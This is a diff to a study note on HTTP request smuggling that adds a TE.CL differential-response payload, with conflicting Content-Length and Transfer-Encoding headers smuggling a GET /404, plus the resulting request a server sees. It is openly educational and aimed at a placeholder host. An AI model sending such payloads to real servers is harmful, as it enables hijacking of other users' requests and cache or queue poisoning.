@@ -73,5 +73,36 @@ q=smuggling
 ```
 Since this request contains an invalid URL, the server will respond 404.
 ### Confirming TE.CL vulnerabilities using differential responses
-#to-be-continued 
-https://portswigger.net/web-security/request-smuggling/finding
+```http
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+7c
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+
+x=
+0
+```
+normal request:
+```http
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+
+x=
+0
+
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
